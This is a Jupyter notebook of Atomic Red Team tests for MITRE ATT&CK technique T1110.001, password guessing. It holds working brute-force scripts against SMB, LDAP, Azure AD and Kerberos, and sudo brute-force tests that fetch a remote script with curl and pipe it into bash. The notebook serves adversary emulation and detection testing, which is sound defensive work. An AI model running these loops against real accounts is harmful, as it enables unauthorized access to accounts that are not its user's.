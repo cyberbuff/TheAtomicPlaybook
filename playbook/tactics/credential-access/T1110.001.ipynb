{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "adc84dc2",
   "metadata": {},
   "source": "# T1110.001 - Password Guessing\nAdversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
  },
  {
   "cell_type": "markdown",
   "id": "06f6bef1",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "099b2afa",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Brute Force Credentials of single Active Directory domain users via SMB",
    "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\necho Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%username%\" \"%p\" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\\IPC$ > NUL\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47b4ee6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "fa3de16f",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
    "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\n\n$passwordList = Get-Content -Path \"PathToAtomicsFolder\\T1110.001\\src\\passwords.txt\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\n  try {\n    Write-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2a232cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b8000a5f",
   "metadata": {},
   "source": "### Atomic Test #3 - Brute Force Credentials of single Azure AD user\nAttempt to brute force Azure AD user via AzureAD powershell module.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86a72f66",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "19c5021c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "edf74ed4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2f4e8a06",
   "metadata": {},
   "source": "### Atomic Test #4 - Password Brute User using Kerbrute Tool\nBruteforce a single user's password from a wordlist\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n\n```\n##### Description: bruteuser.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f17680b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7db5fca4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1 \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "829bdbbf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "1c365b89",
   "metadata": {},
   "source": "### Atomic Test #5 - SUDO Brute Force - Debian\nAn adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Check if running on a Debian based machine.\n\n##### Check Prereq Commands:\n```bash\nif grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\napt update && apt install -y openssl sudo curl\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9bf33dd0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "eb7ba765",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nuseradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3fc7f19a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "ca824ce7",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nuserdel -fr art\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ef12177",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f4758e04",
   "metadata": {},
   "source": "### Atomic Test #6 - SUDO Brute Force - Redhat\nAn adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Check if running on a Redhat based machine.\n\n##### Check Prereq Commands:\n```bash\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\nyum update && yum install -y openssl sudo curl\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a619352",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d620a37f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nuseradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "430f0b30",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "44fdcd6a",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nuserdel -fr art\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "64a3e0e6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8b960b49",
   "metadata": {},
   "source": "### Atomic Test #7 - SUDO Brute Force - FreeBSD\nAn adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if running on a FreeBSD based machine.\n\n##### Check Prereq Commands:\n```bash\nif grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\npkg update && pkg install -y sudo curl bash\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a4ba7e6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "bee05fbc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\npw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17d6b901",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "0572e349",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrmuser -y art\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3282437",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0905d9da",
   "metadata": {},
   "source": "## Detection\nMonitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}